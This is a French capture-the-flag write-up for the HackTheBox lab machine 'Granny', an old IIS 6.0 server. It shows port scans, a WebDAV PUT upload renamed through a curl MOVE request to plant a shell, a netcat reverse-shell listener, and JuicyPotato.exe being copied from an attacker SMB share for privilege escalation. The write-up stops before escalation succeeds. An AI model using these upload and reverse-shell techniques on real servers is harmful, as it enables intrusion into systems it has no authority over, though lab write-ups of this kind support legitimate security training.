## Description
Granny, bien que similaire à Grandpa, peut être exploitée à l'aide de plusieurs méthodes différentes. La méthode prévue pour résoudre cette machine est la vulnérabilité largement connue du téléchargement Webdav.


## Recon
```
─# rustscan  --range 1-65535 -a $ip --ulimit 5000 -- -sV 
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/root/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.129.182.246:80

└─# nmap -sV -sC -p80 $ip
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-10 19:55 CDT
Stats: 0:00:07 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 0.00% done
Nmap scan report for 10.129.182.246
Host is up (0.24s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-webdav-scan: 
|   Server Date: Mon, 11 Mar 2024 00:55:32 GMT
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|   WebDAV type: Unknown
|_  Server Type: Microsoft-IIS/6.0
| http-methods: 
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.59 seconds

```

Ici je trouve des Methods potentielle qui sont autorisee 
- https://www.hackingarticles.in/multiple-ways-to-exploiting-put-method/

mettre un fichier, pour cela je vais utiliser `cadaver`

```
─# cadaver http://$ip                
dav:/> put /home/blo/CTFs/Boot2root/HTB/test.html
Uploading /home/blo/CTFs/Boot2root/HTB/test.html to `/test.html':
Progress: [=============================>] 100.0% of 16 bytes succeeded.
dav:/> 


```


Lorsque je met du `aspx` ca prend pas, mais je vais le mettre en txt et ensuite le deplacer

- https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/put-method-webdav

```
curl -X MOVE --header 'Destination:http://$ip/shell.php' 'http://$ip/shell.txt'
```


```
─# sudo rlwrap nc -lnvp 1337                                
listening on [any] 1337 ...
connect to [10.10.14.16] from (UNKNOWN) [10.129.182.246] 1034
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

c:\windows\system32\inetsrv>whoami
whoami
nt authority\network service


```

## Escalation
```
c:\windows\system32\inetsrv>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAuditPrivilege              Generate security audits                  Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 

c:\windows\system32\inetsrv>
```

J'ai un privilege de SeImpersonatePrivilege qui est deja activee, alors je peux bien utiliser `JuicyPotato` pour elever mes privilege

```
─# impacket-smbserver s .
Impacket v0.12.0.dev1+20231114.165227.4b56c18a - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
C:\WINDOWS\Temp>copy \\10.10.14.16\s\JuicyPotato.exe JuicyPotato.exe
copy \\10.10.14.16\s\JuicyPotato.exe JuicyPotato.exe
        1 file(s) copied.

C:\WINDOWS\Temp>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 424C-F32D

 Directory of C:\WINDOWS\Temp

03/11/2024  03:37 AM    <DIR>          .
03/11/2024  03:37 AM    <DIR>          ..
03/01/2024  04:41 AM           347,648 JuicyPotato.exe
04/12/2017  09:14 PM    <DIR>          rad61C21.tmp
04/12/2017  09:14 PM    <DIR>          radDDF39.tmp
02/28/2024  04:03 AM             1,890 sys.txt
02/18/2007  02:00 PM            22,752 UPD55.tmp
12/24/2017  07:24 PM    <DIR>          vmware-SYSTEM
03/11/2024  02:39 AM            28,362 vmware-vmsvc.log
09/16/2021  02:10 PM             5,826 vmware-vmusr.log
03/11/2024  02:40 AM               819 vmware-vmvss.log
               6 File(s)        407,297 bytes
               5 Dir(s)   1,325,813,760 bytes free

C:\WINDOWS\Temp>
```

Mais l'exploit ne marche pas. alors je vais voir le system

```
systeminfo

Host Name:                 GRANNY
OS Name:                   Microsoft(R) Windows(R) Server 2003, Standard Edition
OS Version:                5.2.3790 Service Pack 2 Build 3790
OS Manufacturer:           Microsoft Corporation


```

- https://kakyouim.hatenablog.com/entry/2020/05/27/010807


Note: Pour les derniers machines. faut utiliser metasploit et ces suggestions